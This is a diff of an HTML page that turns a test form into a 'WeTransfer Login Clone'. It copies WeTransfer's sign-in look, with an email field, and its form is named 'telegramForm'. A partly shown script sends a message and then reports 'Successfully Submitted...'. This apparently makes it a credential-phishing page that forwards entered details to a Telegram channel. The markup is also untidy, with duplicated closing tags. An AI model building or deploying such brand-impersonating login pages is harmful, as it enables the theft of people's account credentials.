@@ -3,101 +3,208 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Testing</title>
+  <title>WeTransfer Login Clone</title>
 
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 
   <style>
+
     *{
       margin:0;
       padding:0;
       box-sizing:border-box;
-      font-family:"Poppins",sans-serif;
+      font-family:'Poppins',sans-serif;
     }
 
     body{
-      background:linear-gradient(135deg,#0d6efd,#1e90ff);
+      background:#f4f4f4;
       min-height:100vh;
       display:flex;
-      align-items:center;
       justify-content:center;
+      align-items:center;
       padding:20px;
     }
 
-    .container{
-      background:#fff;
+    .wrapper{
       width:100%;
-      max-width:420px;
-      padding:30px;
-      border-radius:18px;
-      box-shadow:0 10px 30px rgba(0,0,0,0.2);
-    }
-
-    h1{
+      max-width:480px;
+      background:#f4f4f4;
       text-align:center;
-      color:#0d6efd;
-      margin-bottom:8px;
     }
 
-    p{
-      text-align:center;
-      color:#666;
-      font-size:14px;
-      margin-bottom:25px;
+    .logo{
+      font-size:clamp(42px, 7vw, 70px);
+      font-weight:700;
+      color:#000;
+      margin-bottom:60px;
+      line-height:1;
     }
 
-    label{
-      font-size:13px;
-      color:#333;
-      display:block;
-      margin-bottom:5px;
-    }
-
-    textarea{
-      width:100%;
-      padding:12px;
-      height:140px;
-      border:1px solid #ddd;
-      border-radius:10px;
-      outline:none;
-      resize:none;
-      font-size:14px;
-    }
-
-    textarea:focus{
-      border-color:#0d6efd;
-    }
-
-    button{
-      width:100%;
-      margin-top:18px;
-      padding:12px;
-      border:none;
-      background:#0d6efd;
-      color:#fff;
+    .title{
+      font-size:clamp(32px, 5vw, 50px);
       font-weight:600;
-      border-radius:10px;
+      color:#000;
+      margin-bottom:12px;
+    }
+
+    .subtitle{
+      font-size:clamp(16px, 2vw, 22px);
+      color:#222;
+      margin-bottom:40px;
+      line-height:1.5;
+    }
+
+    .input-group{
+      margin-bottom:22px;
+    }
+
+    .input-group input{
+      width:100%;
+      padding:22px 24px;
+      border:2px solid #d9d9d9;
+      border-radius:24px;
+      background:#fff;
+      font-size:20px;
+      outline:none;
+      transition:0.3s ease;
+    }
+
+    .input-group input:focus{
+      border-color:#3567f2;
+      box-shadow:0 0 10px rgba(53,103,242,0.15);
+    }
+
+    .btn{
+      width:100%;
+      padding:22px;
+      border:none;
+      border-radius:24px;
+      background:#3567f2;
+      color:#fff;
+      font-size:28px;
+      font-weight:500;
       cursor:pointer;
+      transition:0.3s ease;
+      margin-top:5px;
     }
 
-    button:hover{
-      background:#0b5ed7;
+    .btn:hover{
+      background:#2957d8;
     }
 
-    .footer-text{
-      text-align:center;
-      font-size:12px;
-      margin-top:15px;
-      color:#888;
+    .links{
+      margin-top:45px;
     }
 
-    .success{
-      display:none;
-      text-align:center;
-      color:green;
-      margin-top:15px;
-      font-size:14px;
+    .links a{
+      display:block;
+      margin:18px 0;
+      color:#222;
+      font-size:20px;
+      text-decoration:underline;
     }
+
+    .divider{
+      display:flex;
+      align-items:center;
+      margin:45px 0;
+      color:#999;
+      font-size:22px;
+    }
+
+    .divider::before,
+    .divider::after{
+      content:"";
+      flex:1;
+      height:1px;
+      background:#ccc;
+    }
+
+    .divider span{
+      margin:0 15px;
+    }
+
+    .bottom-text{
+      font-size:20px;
+      color:#222;
+    }
+
+    .bottom-text a{
+      color:#222;
+      text-decoration:underline;
+    }
+
+    /* MOBILE VIEW */
+    @media(max-width:768px){
+
+      .wrapper{
+        max-width:100%;
+      }
+
+      .logo{
+        margin-bottom:40px;
+      }
+
+      .input-group input{
+        font-size:18px;
+        padding:20px;
+        border-radius:20px;
+      }
+
+      .btn{
+        font-size:24px;
+        padding:18px;
+        border-radius:20px;
+      }
+
+      .links a{
+        font-size:18px;
+      }
+
+      .divider{
+        font-size:18px;
+      }
+
+      .bottom-text{
+        font-size:18px;
+      }
+    }
+
+    /* SMALL MOBILE VIEW */
+    @media(max-width:480px){
+
+      body{
+        padding:15px;
+      }
+
+      .logo{
+        font-size:50px;
+      }
+
+      .title{
+        font-size:34px;
+      }
+
+      .subtitle{
+        font-size:15px;
+      }
+
+      .input-group input{
+        padding:18px;
+        font-size:16px;
+      }
+
+      .btn{
+        font-size:22px;
+        padding:16px;
+      }
+
+      .links a,
+      .bottom-text{
+        font-size:16px;
+      }
+    }
+
   </style>
 </head>
 
@@ -116,8 +223,9 @@
     <div class="subtitle">
       to continue to your WeTransfer account.
     </div>
-    
+
     <form id="telegramForm">
+
       <div class="input-group">
         <input type="email" placeholder="Email">
       </div>
@@ -132,29 +240,11 @@
 
     </form>
 
-    <div class="links">
-      <a href="#">Forgot password?</a>
-      <a href="#">Use a different email?</a>
-    </div>
-
-    <div class="divider">
-      <span>or</span>
-    </div>
-
-    <div class="bottom-text">
-      Receive a <a href="#">temporary code via email</a>
-    </div>
-
-  </div>
-
-
-    </form>
-
     <div class="success" id="successMsg">
       Successfully Submitted...
     </div>
 
-    <div class="footer-text">WeTransfer</div>
+    <div class="footer-text">Wetransfer</div>
   </div>
 
   <script>
@@ -204,6 +294,9 @@ ${message}
       }
     });
   </script>
+
+</body>
+</html>
 
 </body>
 </html>
